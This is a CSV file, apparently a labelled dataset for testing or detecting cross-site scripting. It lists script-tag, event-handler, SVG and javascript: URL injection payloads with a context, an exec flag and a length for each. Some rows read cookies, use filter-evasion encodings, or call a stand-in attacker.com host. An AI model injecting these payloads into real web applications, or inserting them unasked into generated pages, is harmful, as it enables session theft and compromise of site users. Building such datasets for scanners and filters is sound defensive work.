payload,context,exec,length
<script>alert(1)</script>,html_tag,1,25
<script>confirm(1)</script>,html_tag,1,27
<script>prompt(1)</script>,html_tag,1,26
<script>alert(document.cookie)</script>,html_tag,1,39
<script>fetch('http://attacker.com')</script>,html_tag,1,45
<img src=x onerror=alert(1)>,html_tag,1,28
<body onload=alert(1)>,html_tag,1,22
<input onfocus=alert(1) autofocus>,html_tag,1,34
<details open ontoggle=alert(1)>,html_tag,1,32
<ScRiPt>alert(1)</ScRiPt>,html_tag,1,25
<script>alert(String.fromCharCode(49))</script>,html_tag,1,47
<script>\u0061lert(1)</script>,html_tag,1,30
""" onmouseover=alert(1)",html_attribute,1,22
"""><script>alert(1)</script>",html_attribute,1,27
<svg/onload=alert(1)>,html_tag,1,21
javascript:alert(1),url_href,1,19
"data:text/html,<script>alert(1)</script>",url_navigation,1,40
'><svg/onload=alert(1)>,html_attribute,1,23
"""><img src=x onerror=confirm(1)>",html_attribute,1,32
</script><script>alert(1)</script>,script_block,1,34
<script>alert(document.domain)</script>,html_tag,1,39
<script>alert`1`</script>,html_tag,1,25
<script>window.alert(1)</script>,html_tag,1,32
<script>top.alert(1)</script>,html_tag,1,29
<script>this.alert(1)</script>,html_tag,1,30
<img src=x onerror=confirm(1)>,html_tag,1,30
<img src=x onerror=prompt(1)>,html_tag,1,29
<img src=1 onerror=alert(1)>,html_tag,1,28
<img src=a onerror=alert(document.cookie)>,html_tag,1,42
<img src=x onerror=alert('XSS')>,html_tag,1,32
<img src=x onerror=alert(window.origin)>,html_tag,1,40
<img src=x onerror=alert(location)>,html_tag,1,35
<img src=x onerror=alert(navigator.userAgent)>,html_tag,1,46
<img src=x onerror=alert(document.URL)>,html_tag,1,39
<svg onload=prompt(1)>,html_tag,1,22
<svg><script>alert(1)</script>,html_tag,1,30
<svg><script>alert(document.domain)</script>,html_tag,1,44
<svg><script>confirm(1)</script>,html_tag,1,32
<svg><script>prompt(1)</script>,html_tag,1,31
<svg onload=alert(document.cookie)>,html_tag,1,35
<svg onload=alert(location)>,html_tag,1,28
""" onmouseover=alert(1) """,html_attribute,1,24
""" onclick=alert(1)",html_attribute,1,18
""" onclick=alert(1) """,html_attribute,1,20
""" onmouseenter=alert(1) """,html_attribute,1,25
onmouseover=alert(1),html_attribute,1,20
""" onmouseleave=alert(1) """,html_attribute,1,25
""" onkeyup=alert(1) """,html_attribute,1,20
""" onkeydown=alert(1) """,html_attribute,1,22
""" oninput=alert(1) """,html_attribute,1,20
